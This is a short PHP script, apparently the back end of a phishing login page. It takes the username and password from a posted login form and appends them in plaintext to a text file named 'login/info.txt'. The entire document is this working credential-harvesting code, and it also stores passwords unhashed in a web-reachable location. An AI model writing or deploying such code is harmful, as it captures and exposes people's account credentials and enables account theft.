<?php
 $path = 'login/info.txt';
 if (isset($_POST['loginUser']) && isset($_POST['loginPass'])) {
     $fh = fopen($path,"a+");
     $string = $_POST['loginUser'].' - '.$_POST['loginPass'];
     fwrite($fh,$string); // Write information to the file
     fclose($fh); // Close the file
 }
?>
